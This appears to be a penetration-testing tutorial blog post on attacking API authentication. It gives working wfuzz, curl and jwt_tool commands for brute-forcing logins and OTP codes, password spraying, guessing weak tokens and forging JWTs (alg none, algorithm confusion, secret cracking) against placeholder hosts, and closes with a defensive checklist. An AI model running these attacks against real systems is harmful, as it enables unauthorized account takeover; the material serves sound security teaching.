# Breaking API Authentication: Everything I Learned About Brute-Forcing, Spraying, and Forging Tokens

## Why I Keep Coming Back to Authentication First

Every time I start a new API penetration test, authentication is the first thing I poke at. Not because it's glamorous — it isn't — but because it's the gate. If I can walk through the gate without a key, nothing else about the API's "security" really matters. I've tested plenty of APIs with beautifully locked-down business logic and airtight authorization checks that still fell over in the first ten minutes because the login endpoint had no rate limiting, or because a developer decided `"alg": "none"` was a reasonable default during a sprint three years ago and nobody ever revisited it.

In this post I want to walk through the authentication attacks I rely on most often when testing REST APIs: classic brute-force and password-spraying attacks, attacks against password-reset and MFA flows, token prediction attacks, and the various ways JSON Web Tokens (JWTs) get abused in the wild. I'll show you the commands I actually type, the kind of output I expect to see, and the thought process I go through when deciding which technique to reach for. I'll also flag the places where I've gotten myself in trouble (or could have) so you don't repeat my mistakes.

A quick disclaimer before we start: everything below is intended for authorized testing — your own lab environments, bug bounty programs that explicitly permit it, or engagements where you have signed authorization. Running these techniques against systems you don't own or have permission to test is illegal in most jurisdictions. I'll repeat this warning a few more times because it matters.

> **Caution**
> Brute-force and password-spraying attacks generate a lot of traffic and can lock out real user accounts, trip fraud-detection systems, or even take down poorly provisioned authentication services. Always confirm scope and get explicit sign-off before running these attacks, and consider running them against staging/lab instances first.

---

## Table of Contents

1. Why Authentication Breaks So Often in APIs
2. Classic Authentication Attacks
   - Brute-Forcing Login Endpoints
   - Attacking Password Reset and MFA/OTP Flows
   - Password Spraying
   - Dealing with Base64-Encoded Credentials
3. Token Prediction and Forgery
4. JSON Web Token (JWT) Abuse
   - Anatomy of a JWT
   - The "none" Algorithm Attack
   - The Algorithm Confusion (RS256 → HS256) Attack
   - Cracking the JWT Signing Secret
5. A Worked Lab Example
6. Detection and Defense Checklist
7. Final Thoughts

---

## 1. Why Authentication Breaks So Often in APIs

I've noticed the same handful of mistakes over and over again across different companies, different stacks, different industries. APIs inherit every classic web authentication flaw — weak password policies, default credentials, verbose error messages that leak whether a username exists, broken password-reset flows — but they also introduce a few problems that are more specific to how APIs are built:

- **No session state.** REST APIs are supposed to be stateless, so instead of a session cookie, you usually get an API key, a bearer token, or a JWT. If that token is predictable, poorly signed, or never expires, it becomes a long-lived backdoor.
- **A single token used everywhere.** I still see APIs where one static API key authenticates every request for every user of an integration, which means stealing one key compromises the entire tenant.
- **Insufficient entropy in token generation.** Developers sometimes roll their own token scheme ("just concatenate the username and a timestamp and hash it") instead of using a cryptographically secure random generator.
- **Inconsistent rate limiting.** I frequently find that the main login endpoint is rate-limited, but the "forgot password" or "verify OTP" endpoints are not, which gives me a side door.

I keep this mental model in mind: every API authentication mechanism eventually boils down to "prove who you are" (brute-forceable) and "here's a token that proves you already did" (forgeable or stealable). Below I'll go through both halves.

---

## 2. Classic Authentication Attacks

### Brute-Forcing Login Endpoints

The mechanics of brute-forcing an API endpoint aren't fundamentally different from brute-forcing a web login form — I'm still sending a flood of credential guesses and watching for a response that looks different from a failure. The differences are mostly about format: the payload is usually JSON instead of form-encoded data, and the credentials might be base64-encoded somewhere in the request.

My workflow usually looks like this:

1. Capture a legitimate login request in Burp Suite (or just read the API documentation if it's available).
2. Identify what a **failed** login looks like — status code, response length, response body.
3. Build or source a wordlist. For a generic brute force I reach for something like `rockyou.txt`; for a targeted attack against a specific company, I build a custom list based on OSINT.
4. Fire the requests with a tool that supports JSON bodies and header injection — I usually reach for `wfuzz` or Burp Intruder.
5. Filter out the "normal failure" responses and look for the outlier.

Here's a representative command. Assume I've already confirmed that a failed login returns HTTP 401 with a consistent body, and I want to hide those from my results:

```bash
wfuzz -d '{"email":"test.user@example.com","password":"FUZZ"}' \
  --hc 401 \
  -H 'Content-Type: application/json' \
  -z file,/opt/wordlists/common-passwords.txt \
  https://api.example.local/v1/auth/login
```

And here's the kind of output I'm looking for — note that most lines get filtered out by `--hc 401`, so what's left stands out immediately:

```text
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://api.example.local/v1/auth/login
Total requests: 14344

=====================================================================
ID           Response   Lines    Word     Chars       Payload
=====================================================================

000008821:   200        0 L      1 W      187 Ch      "Summer2024!"

Total time: 46.2178
Processed Requests: 14344
Filtered Requests: 14343
Requests/sec.: 310.3539
```

A single `200` with a different character count buried in thousands of `401`s is exactly the signal I want. Once I see it, I validate it manually with a single `curl` request before trusting it:

```bash
curl -s -X POST https://api.example.local/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"test.user@example.com","password":"Summer2024!"}' | jq
```

```json
{
  "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "expiresIn": 3600,
  "tokenType": "Bearer"
}
```

> **Note**
> I always generate my wordlists with the target in mind rather than throwing a generic list at every engagement. If I found an excessive-data-exposure bug earlier in the assessment — maybe a user-enumeration endpoint leaked whether MFA was enabled, or a support ticket export revealed naming conventions — I feed that context into a targeted list generator rather than wasting time on `rockyou.txt`, which is over a decade old and full of passwords nobody uses anymore.

### Attacking Password Reset and MFA/OTP Flows

This is the part of the authentication surface I find developers neglect the most. Teams will spend weeks hardening the main login endpoint — rate limiting, CAPTCHA, account lockout — and then leave the "forgot password" or "verify your code" endpoint wide open, because nobody thought of it as "authentication."

If an API sends a 4-to-6-digit one-time code via SMS or email to verify identity during password reset or MFA, and that endpoint doesn't rate-limit guesses, I can often brute-force the code directly. A 4-digit numeric OTP is only 10,000 possibilities — trivially fast to exhaust if there's no lockout.

Here's the flow I follow:

```mermaid
flowchart TD
    A["Capture reset request\n/auth/verify-otp"] --> B{"Rate limiting\npresent?"}
    B -- "No" --> C["Mark OTP field as\nIntruder/Wfuzz position"]
    B -- "Yes" --> D["Look for a side door:\nemail flow, old API version,\nmobile app endpoint"]
    C --> E["Brute-force 0000-9999"]
    E --> F{"Response differs\n(200 vs 400/422)?"}
    F -- "Yes" --> G["Valid OTP found —\nreset password / bypass MFA"]
    F -- "No" --> H["Check character set:\nalphanumeric? longer length?"]

    style A fill:#1f6feb,stroke:#0d3b73,color:#ffffff
    style B fill:#f0ad4e,stroke:#8a6d3b,color:#000000
    style C fill:#6f42c1,stroke:#3d2461,color:#ffffff
    style D fill:#d9534f,stroke:#7a2e2a,color:#ffffff
    style E fill:#6f42c1,stroke:#3d2461,color:#ffffff
    style F fill:#f0ad4e,stroke:#8a6d3b,color:#000000
    style G fill:#28a745,stroke:#145523,color:#ffffff
    style H fill:#d9534f,stroke:#7a2e2a,color:#ffffff
```

A captured reset-verification request usually looks something like this:

```http
POST /api/v3/auth/verify-otp HTTP/1.1
Host: api.example.local
Content-Type: application/json
Content-Length: 61

{
  "email": "test.user@example.com",
  "otp": "1234",
  "newPassword": "NewPassw0rd!"
}
```

I mark the `otp` value as my fuzzing position and run something like:

```bash
wfuzz -d '{"email":"test.user@example.com","otp":"FUZZ","newPassword":"NewPassw0rd!"}' \
  --hc 422 \
  -H 'Content-Type: application/json' \
  -z range,0000-9999 \
  https://api.example.local/api/v3/auth/verify-otp
```

If the endpoint isn't rate-limited, this finishes in well under a minute and I usually get a single standout response with a 200 status code — my valid OTP.

> **Caution**
> OTP brute-forcing is one of the fastest ways to lock real users out of their accounts or trigger anti-fraud alerting, since you're effectively hammering a real communications channel (SMS/email) if the OTP is tied to live delivery. Only do this against test accounts you control, and check with the client whether the OTP service has its own cost implications (SMS gateways charge per message, and a brute force can rack up a surprising bill).

### Password Spraying

Straight brute-forcing assumes the target doesn't have an account lockout policy, which is an increasingly bad assumption. Password spraying flips the attack around: instead of trying many passwords against one account, I try a handful of very likely passwords against *many* accounts. Most lockout policies only count failed attempts per account, so as long as I stay under the threshold (say, under 10 attempts per account) I usually fly under the radar.

The key ingredients are a good username list and a short, high-probability password list. I build my password list around two categories:

| Category | Examples | Why it works |
|---|---|---|
| Seasonal/formulaic | `Winter2026!`, `Spring2026!`, `Autumn2026?` | Meets most complexity rules, easy for help desks to generate as temporary passwords, easy for users to remember |
| Org-specific | `CompanyName@2026`, `FirstInitiaLastName1!` | Derived from the target's branding, founder names, or product names found during recon |

Here's a short spraying list I might build for a fictional target called Acme Corp:

```text
Winter2026!
Spring2026!
Acme@2026
Welcome1!
QWER!@#$
Password1!
AcmeCorp2026!
```

Burp Intruder's **cluster bomb** attack type is my go-to for spraying because it iterates every combination of two payload sets — usernames in position one, passwords in position two — without ever trying more than a few passwords per account. I always double check the attack type before launching; sniper or pitchfork modes won't give me the cross product I need.

```mermaid
graph LR
    subgraph "Payload Set 1 — Usernames"
        U1["alice@acme.com"]
        U2["bob@acme.com"]
        U3["carol@acme.com"]
        U4["...hundreds more"]
    end
    subgraph "Payload Set 2 — Passwords"
        P1["Winter2026!"]
        P2["Acme@2026"]
        P3["Welcome1!"]
    end
    U1 & U2 & U3 & U4 --> CB["Cluster Bomb\n(every user × every password)"]
    P1 & P2 & P3 --> CB
    CB --> R["Sort results by\nstatus code & length"]
    R --> F["200/300 anomaly =\nvalid credential pair"]

    style U1 fill:#1f6feb,color:#fff
    style U2 fill:#1f6feb,color:#fff
    style U3 fill:#1f6feb,color:#fff
    style U4 fill:#1f6feb,color:#fff
    style P1 fill:#6f42c1,color:#fff
    style P2 fill:#6f42c1,color:#fff
    style P3 fill:#6f42c1,color:#fff
    style CB fill:#f0ad4e,color:#000
    style R fill:#f0ad4e,color:#000
    style F fill:#28a745,color:#fff
```

When I review results, I sort by response length and status code rather than reading every row — a successful login almost always produces a response that's a noticeably different size from the standard failure.

> **Note**
> Maximizing the username list matters more than people think. I'd rather have 500 real usernames and 5 passwords than 20 usernames and 50 passwords — the odds of success scale with coverage of real accounts, and most organizations have at least a few employees using a predictable seasonal password.

### Dealing with Base64-Encoded Credentials

Every so often I run into an API that base64-encodes the request body (or just the password field) before comparing it against stored values on the backend. Encoding is not encryption, and it adds essentially zero security — but it does mean I have to adjust my tooling so my payloads get encoded before they're sent.

In Burp Intruder, this is a payload-processing rule: I select my attack position, go to the **Payload Processing** section, and add an **Encode → Base64-encode** rule so each guess from my wordlist is automatically encoded before it hits the wire. In `wfuzz`, I either pre-encode my entire wordlist with a quick script or pipe candidates through `base64` before building the file:

```bash
while read -r pass; do
  printf '%s' "$pass" | base64
done < passwords.txt > passwords_b64.txt
```

```bash
wfuzz -d '{"email":"dGVzdC51c2VyQGV4YW1wbGUuY29t","password":"FUZZ"}' \
  --hc 401 \
  -H 'Content-Type: application/json' \
  -z file,passwords_b64.txt \
  https://api.example.local/v1/auth/login
```

---

## 3. Token Prediction and Forgery

Once a user authenticates, the API typically hands back a token for subsequent requests. If the generation process for that token is predictable — sequential IDs, timestamps with low entropy, a short random suffix appended to a static prefix — I can potentially forge or guess other users' tokens without ever touching their password.

My process for analyzing token randomness almost always goes through **Burp Suite's Sequencer**:

1. **Manual load analysis** — if I already have a sample of tokens (say, from multiple test accounts I control, or leaked in logs), I load them directly and ask Sequencer to run bit-level and character-level analysis.
2. **Live capture analysis** — if the API will generate tokens on demand, I point Sequencer at the live endpoint and let it request thousands of tokens automatically, scoring the effective entropy as it goes.

The single most useful output from this process, for me, is the **character position analysis** — it tells me which positions in the token stay fixed and which ones actually vary. If I find a token like `Ab4dt0k3nXY7` where only the final three characters change, my brute-force space shrinks from "guess the whole token" to "guess three characters," which might be only a few hundred combinations.

```mermaid
sequenceDiagram
    participant Me as Tester
    participant Seq as Burp Sequencer
    participant API as Target API

    Me->>API: Request token (x many times)
    API-->>Seq: Captured tokens (live capture)
    Seq->>Seq: Bit-level + character-level analysis
    Seq-->>Me: Entropy report + fixed vs. variable positions
    Me->>Me: Build minimal brute-force charset
    Me->>API: Brute-force only the weak positions
    API-->>Me: Valid token(s) for other accounts
```

Once I know which characters vary, I switch back to Intruder or `wfuzz` to brute-force just that window. Here's an example against a token where I've determined the first nine characters are static (`Ab4dt0k3n`) and the final three follow a pattern of letter-letter-digit, with the letters restricted to `a`–`d`:

```bash
wfuzz -u https://api.example.local/v2/user/dashboard \
  --hc 404 \
  -H "Authorization: Bearer Ab4dt0k3nFUZZFUZ2ZFUZ3Z" \
  -z list,a-b-c-d \
  -z list,a-b-c-d \
  -z range,0-9
```

```text
=====================================================================
ID           Response   Lines    Word     Chars       Payload
=====================================================================
000000091:   200        1 L      10 W     345 Ch      "ca1"
000000092:   200        1 L      10 W     345 Ch      "cb2"
000000093:   200        1 L      10 W     345 Ch      "cc3"
000000094:   200        1 L      10 W     345 Ch      "cd4"
000000095:   200        1 L      10 W     345 Ch      "ce5"
```

Every `200` here represents a potentially valid token for a different account. I always validate a handful of them manually with `curl` before writing anything up — false positives happen, especially if the endpoint returns 200 for both valid and invalid-but-well-formed tokens.

| Finding | Risk | Typical Fix |
|---|---|---|
| Fixed prefix + short variable suffix | High — brute-forceable in seconds to minutes | Use a CSPRNG for the entire token, not just part of it |
| Sequential numeric token/session IDs | Critical — trivially enumerable | Switch to opaque, randomly generated identifiers (UUIDv4 or better) |
| Timestamp-based tokens with no random component | High — guessable within a narrow time window | Add a cryptographically random component of sufficient length |
| Tokens that never expire or invalidate | Medium-High — amplifies any of the above | Enforce short expiry + server-side revocation list |

---

## 4. JSON Web Token (JWT) Abuse

JWTs deserve their own section because they're everywhere, and because the ways they get misconfigured are wonderfully consistent across completely unrelated companies. I think this is because JWT libraries give developers a lot of rope, and the "convenient" default in several older libraries was dangerously permissive.

### Anatomy of a JWT

A JWT is three base64url-encoded segments joined by periods: **header**, **payload**, and **signature**.

```mermaid
flowchart LR
    subgraph JWT["A JSON Web Token"]
        direction LR
        H["HEADER\nalg, typ"] -->|"."| P["PAYLOAD\nclaims: sub, iat,\nexp, roles, etc."]
        P -->|"."| S["SIGNATURE\nHMAC or RSA output"]
    end

    style H fill:#1f6feb,color:#fff,stroke:#0d3b73
    style P fill:#6f42c1,color:#fff,stroke:#3d2461
    style S fill:#d9534f,color:#fff,stroke:#7a2e2a
```

A decoded header typically looks like this:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

And a decoded payload might look like this:

```json
{
  "sub": "1042",
  "name": "test.user",
  "role": "user",
  "iat": 1752000000,
  "exp": 1752003600
}
```

The signature is what actually protects the first two segments from tampering — it's the output of signing the base64url-encoded header and payload with either a shared secret (symmetric algorithms like `HS256`) or a private key (asymmetric algorithms like `RS256`). Without knowing the secret or private key, an attacker shouldn't be able to produce a valid signature for a modified payload.

Shouldn't. That word is doing a lot of work, because the next three attacks all exploit situations where "shouldn't" turns into "can."

### The "none" Algorithm Attack

The JWT spec includes an `alg` value of `"none"`, meaning the token is unsigned. This exists for legitimate but narrow use cases, and some libraries historically accepted it by default even when the application never intended to issue unsigned tokens. If I find an API that accepts a JWT with `"alg": "none"`, I can edit the payload to claim to be any user — including an administrator — remove the signature entirely, and the server will trust it.

Here's the process, step by step:

1. Decode the existing JWT (any decent proxy tool does this automatically; I also like `jwt.io` for a quick visual check).
2. Change the `alg` field in the header to `none`.
3. Edit the payload — for example, change `"role": "user"` to `"role": "admin"`.
4. Base64url-encode both segments again.
5. Join them with periods, but leave the signature segment **empty**, keeping the trailing period.

```bash
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
echo -n '{"sub":"1042","name":"test.user","role":"admin","iat":1752000000,"exp":1752003600}' | base64 | tr -d '=' | tr '/+' '_-'
```

I then concatenate the two outputs with a period between them and a trailing period at the end (no signature):

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDQyIiwibmFtZSI6InRlc3QudXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1MjAwMDAwMCwiZXhwIjoxNzUyMDAzNjAwfQ.
```

I send this as the `Authorization: Bearer` value in a request and watch what comes back:

```bash
curl -s https://api.example.local/v1/admin/users \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDQyIiwibmFtZSI6InRlc3QudXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1MjAwMDAwMCwiZXhwIjoxNzUyMDAzNjAwfQ." \
  -i
```

If the server is vulnerable, I get back a `200` and a list of users I should never have been able to see as a regular account. If it's properly configured, I get a `401` and move on to the next attack.

### The Algorithm Confusion (RS256 → HS256) Attack

This one is subtler and, in my experience, more common in mature APIs that have already fixed the `none` issue. Some APIs use asymmetric signing (`RS256`) where the server holds a private key to sign tokens and a public key to verify them. The public key, by design, isn't secret — it's often published at a `/.well-known/jwks.json` endpoint or embedded in a mobile app.

The vulnerability shows up when the server's JWT verification library doesn't pin the expected algorithm and blindly trusts whatever `alg` value is in the token header. If I switch the header from `RS256` to `HS256`, the server may try to verify the signature using HMAC — and if the "secret" it uses for that HMAC check is the same public key string it was already using for RS256 verification, I can sign my own forged token with that public key, since it's not actually secret to me at all.

```mermaid
flowchart TD
    A["Normal flow:\nServer signs with RS256\nprivate key"] --> B["Server verifies with\nRS256 public key"]
    C["Attacker obtains\npublic key\n(JWKS endpoint, app binary)"] --> D["Attacker crafts token,\nsets alg: HS256"]
    D --> E["Attacker signs token using\nHMAC-SHA256 with the\npublic key AS the secret"]
    E --> F{"Server verification\nlogic pins algorithm?"}
    F -- "No — trusts header" --> G["Server treats public key\nas HMAC secret too\n→ signature validates"]
    F -- "Yes — pins RS256" --> H["Signature verification\nfails, request rejected"]

    style A fill:#1f6feb,color:#fff
    style B fill:#1f6feb,color:#fff
    style C fill:#d9534f,color:#fff
    style D fill:#6f42c1,color:#fff
    style E fill:#6f42c1,color:#fff
    style F fill:#f0ad4e,color:#000
    style G fill:#dc3545,color:#fff
    style H fill:#28a745,color:#fff
```

In practice I'd save the public key to a file and use a purpose-built tool rather than hand-crafting the HMAC myself:

```bash
jwt_tool eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMDQyIn0.SIGNATURE_HERE \
  -X k \
  -pk rsa_public_key.pem
```

A vulnerable server will respond with a `200` to a request authenticated with the resulting forged token; a properly hardened one pins the expected algorithm server-side and rejects the mismatch outright, regardless of what the token header claims.

### Cracking the JWT Signing Secret

If neither of the above works, I still have one more option against symmetric (`HS256`/`HS384`/`HS512`) tokens: try to crack the signing secret offline. This doesn't touch the live API at all — I grab one valid JWT, then run a dictionary or brute-force attack locally to see if any candidate string produces a matching signature.

```bash
jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDQyIn0.abc123signature \
  -C -d /opt/wordlists/jwt-secrets.txt
```

```text
[*] Tested 250,000 secrets so far...
[*] Tested 500,000 secrets so far...
[*] Tested 750,000 secrets so far...
[+] acmecorp2026 is the CORRECT key!

You can tamper/fuzz the token contents and sign it using:
python3 jwt_tool.py [options] -S hs256 -p "acmecorp2026"
```

Once I have the secret, I own the token-signing process completely. I can mint a JWT for any user I want, with any claims I want — including a fictional admin account that doesn't even exist yet — and the server will accept it as legitimate, because mathematically it is: it's signed with the correct key.

| Attack | What it exploits | Typical fix |
|---|---|---|
| `none` algorithm | Library trusts the `alg` field blindly | Reject `none` explicitly; pin accepted algorithms server-side |
| Algorithm confusion (RS256→HS256) | Public key reused as HMAC secret | Pin the expected algorithm per key; never accept alg from the token |
| Signature cracking | Weak/guessable shared secret | Use a long, randomly generated secret (32+ bytes); rotate periodically |
| Token replay | No expiry or revocation | Short `exp`, refresh-token rotation, server-side blocklist |

---

## 5. A Worked Lab Example

To tie this together, here's roughly how I'd approach a lab environment (like the intentionally vulnerable crAPI project, which I'd strongly recommend spinning up locally if you want to practice any of this safely) end to end:

1. **Register or log in** with Burp's proxy intercepting traffic, and capture the resulting bearer token.
2. **Decode the token** and confirm it's a three-part JWT. Check the `alg` field first — if it says `none`, I'm basically done already.
3. **Try the signature-stripping trick** (empty signature, trailing period) as a zero-cost first move, even before touching the algorithm.
4. **If that fails, attempt a dictionary crack** against the signature using a target-specific wordlist — I build mine from the company name, product name, and common year/symbol combinations, since generic lists like `rockyou.txt` rarely contain company-specific secrets.
5. **Once I recover the secret**, I forge a token for a different account (ideally one I've enumerated earlier in the engagement — usernames leaked via verbose errors or excessive data exposure are gold here) and confirm I can access resources that shouldn't belong to me.
6. **Document everything** — exact requests, exact responses, the secret I recovered (redacted appropriately in the report), and a clear impact statement: what an attacker could actually do with this.

```mermaid
flowchart TD
    Start(["Capture valid JWT"]) --> Decode["Decode header + payload"]
    Decode --> NoneCheck{"alg = none\nalready?"}
    NoneCheck -- Yes --> Win1["Forge payload directly\nNo crack needed"]
    NoneCheck -- No --> StripSig["Try stripping the\nsignature entirely"]
    StripSig --> StripWorks{"Accepted?"}
    StripWorks -- Yes --> Win1
    StripWorks -- No --> AlgSwitch["Try RS256 → HS256\nconfusion attack"]
    AlgSwitch --> AlgWorks{"Accepted?"}
    AlgWorks -- Yes --> Win2["Forge with public\nkey as HMAC secret"]
    AlgWorks -- No --> Crack["Dictionary/brute-force\ncrack the HS* secret"]
    Crack --> CrackWorks{"Secret found?"}
    CrackWorks -- Yes --> Win3["Forge any token\nwith recovered secret"]
    CrackWorks -- No --> Report["Document findings,\nmove to next attack surface"]

    style Start fill:#1f6feb,color:#fff
    style Win1 fill:#28a745,color:#fff
    style Win2 fill:#28a745,color:#fff
    style Win3 fill:#28a745,color:#fff
    style Report fill:#f0ad4e,color:#000
```

---

## 6. Detection and Defense Checklist

I always flip my offensive notes into a defensive checklist for the report, because a finding is only useful if it comes with a fix. Here's the list I hand to development teams after an engagement like this:

| Area | What I check for | What "good" looks like |
|---|---|---|
| Rate limiting | Login, password reset, OTP verification, token refresh | Per-account **and** per-IP throttling, with exponential backoff |
| Error messages | Does the API say "user not found" vs "invalid credentials"? | Identical, generic error for all auth failures |
| Password policy | Minimum length/complexity enforced server-side | 12+ characters, checked against breach-password lists (e.g., HaveIBeenPwned's range API), not just a regex |
| OTP/MFA codes | Code length, character set, expiry, attempt limiting | 6+ digits, short expiry (under 5 minutes), hard lockout after a handful of attempts |
| Token entropy | Randomness across the entire token, not just part of it | CSPRNG-generated, 128+ bits of entropy, no predictable fixed segments |
| JWT algorithm handling | Does verification code pin the expected `alg`? | Server-side allowlist of exactly one algorithm per key; `none` explicitly rejected |
| JWT secret strength | Length and randomness of the HMAC secret | 256-bit+ randomly generated secret, stored in a secrets manager, rotated periodically |
| Token lifecycle | Expiry, refresh, and revocation | Short-lived access tokens, rotated refresh tokens, server-side revocation on logout/compromise |

> **Note**
> None of these fixes are exotic. Almost every framework (Express with `express-rate-limit`, Django REST Framework's throttling classes, Spring Security's lockout mechanisms) has first-party support for rate limiting and sane JWT verification. The gap is almost always "nobody configured it," not "it's technically impossible."

---

## 7. Final Thoughts

What strikes me most, writing this up, is how little of this requires exotic tooling. A fuzzer, a proxy, a token-analysis tool, and a decent wordlist cover the overwhelming majority of authentication weaknesses I find in real engagements. The sophistication isn't in the tools — it's in reading the responses carefully, building targeted wordlists instead of throwing generic ones at everything, and understanding just enough of how JWTs and tokens are supposed to work that you immediately notice when something is implemented wrong.

If you're on the defensive side reading this, my honest advice is: assume your authentication endpoints will be fuzzed, assume your JWT library's defaults might be more permissive than you think, and test these exact attacks against your own API in a staging environment before someone else does it for you in production.

And if you're on the offensive side — practice this responsibly. Spin up an intentionally vulnerable lab (crAPI and similar projects exist exactly for this reason), get comfortable with the tools, and only ever point them at systems you're explicitly authorized to test.

> **Caution**
> I'll say it one final time because it's the most important sentence in this entire post: every technique above is for authorized testing only. Unauthorized access to computer systems — even "just checking" — is a criminal offense in most countries. Get it in writing before you start.

---

## Appendix: Quick-Reference Command Cheat Sheet

I keep a version of this table pinned next to my terminal during engagements so I don't have to dig through notes mid-assessment.

| Goal | Tool | Command pattern |
|---|---|---|
| Brute-force login | `wfuzz` | `wfuzz -d '{"email":"X","password":"FUZZ"}' --hc 401 -H 'Content-Type: application/json' -z file,list.txt URL` |
| Brute-force numeric OTP | `wfuzz` | `wfuzz -d '{...,"otp":"FUZZ",...}' --hc 422 -z range,0000-9999 URL` |
| Password spray | Burp Intruder | Cluster bomb, Payload Set 1 = usernames, Payload Set 2 = short password list |
| Base64-encode payloads on the fly | Burp Intruder | Payloads tab → Payload Processing → Add → Encode → Base64-encode |
| Analyze token randomness | Burp Sequencer | Manual Load (100+ tokens) or Live Capture (up to 20,000) |
| Brute-force a weak token suffix | `wfuzz` | `wfuzz -u URL --hc 404 -H "Authorization: Bearer PREFIXFUZZ" -z list,charset` |
| Decode a JWT | `jwt_tool` / jwt.io | `jwt_tool <token>` |
| Strip JWT signature | manual | Keep header+payload, remove everything after the final period, leave trailing `.` |
| Force `alg: none` | `jwt_tool` | `jwt_tool <token> -X a` |
| Algorithm confusion (RS256→HS256) | `jwt_tool` | `jwt_tool <token> -X k -pk public-key.pem` |
| Crack JWT secret | `jwt_tool` | `jwt_tool <token> -C -d wordlist.txt` |
| Sign a forged token with a known secret | `jwt_tool` | `jwt_tool <token> -S hs256 -p "secret"` |

I also keep a short personal checklist of questions I ask myself before I even open Burp, because the attack I pick depends entirely on the answers:

- Does the API use basic auth, API keys, or tokens — and if tokens, are they JWTs or opaque strings?
- Is there any visible rate limiting on the login endpoint? On the password-reset endpoint? They're often configured differently, and the weaker one is where I start.
- Does a failed login response differ at all from a successful one in status code, length, or timing?
- If it's a JWT, what does the `alg` field say, and does the payload contain anything sensitive or privilege-related, like a `role` or `isAdmin` claim?
- Have I already found usernames or emails elsewhere in the assessment that I can feed into a spraying attack instead of starting from zero?

Answering those five questions up front has saved me a huge amount of wasted effort over the years — it's tempting to jump straight to the "cool" JWT attacks, but half the time the win is sitting in a completely unprotected password-reset endpoint that nobody thought to rate-limit.

Thanks for reading. If you try any of this against a lab environment, I'd genuinely love to hear which attack got you in first — in my experience it's almost always the password-reset flow, not the JWT, that cracks first.
